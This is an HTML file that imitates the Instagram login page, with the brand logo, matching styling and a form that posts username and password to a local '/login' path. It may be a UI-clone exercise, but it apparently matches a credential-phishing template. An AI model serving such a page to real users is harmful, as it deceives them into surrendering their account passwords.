<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Instagram Login</title>
  <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
  <style>
    body {
      background-color: #fafafa;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .container {
      background: white;
      border: 1px solid #dbdbdb;
      padding: 40px;
      width: 350px;
      text-align: center;
    }

    .logo {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      margin-bottom: 30px;
    }

    .logo-text {
      font-family: 'Grand Hotel', cursive;
      font-size: 48px;
      color: #262626;
    }

    .logo-icon {
      width: 40px;
      height: 40px;
    }

    input {
      width: 100%;
      padding: 10px;
      margin: 6px 0;
      border: 1px solid #dbdbdb;
      border-radius: 4px;
      background-color: #ffffff;
    }

    button {
      width: 100%;
      padding: 10px;
      background-color: #0095f6;
      color: white;
      border: none;
      border-radius: 4px;
      font-weight: bold;
      margin-top: 10px;
      cursor: pointer;
    }

    .or-line {
      display: flex;
      align-items: center;
      text-align: center;
      margin: 20px 0;
    }

    .or-line::before,
    .or-line::after {
      content: '';
      flex: 1;
      border-bottom: 1px solid #dbdbdb;
    }

    .or-line span {
      margin: 0 10px;
      font-size: 13px;
      color: #8e8e8e;
    }

    .facebook-login {
      color: #385185;
      font-weight: bold;
      text-decoration: none;
      font-size: 14px;
    }

    .facebook-login img {
      vertical-align: middle;
      margin-right: 6px;
      width: 16px;
    }

    .forgot {
      font-size: 12px;
      color: #00376b;
      margin-top: 15px;
      cursor: pointer;
    }

    .signup {
      margin-top: 30px;
      font-size: 14px;
    }

    .signup a {
      color: #0095f6;
      font-weight: bold;
      text-decoration: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="icon" class="logo-icon" />
      <div class="logo-text">Instagram</div>
    </div>

    <!-- LOGIN FORM -->
    <form action="/login" method="POST">
      <input type="text" name="username" placeholder="Username or email" required />
      <input type="password" name="password" placeholder="Password" required />
      <button type="submit">Log In</button>
    </form>

    <div class="or-line"><span>OR</span></div>

    <a href="#" class="facebook-login">
      <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook" />
      Log in with Facebook
    </a>
    <div class="forgot">Forgot password?</div>
    <div class="signup">
      Don't have an account? <a href="#">Sign up</a>
    </div>
  </div>
</body>
</html>
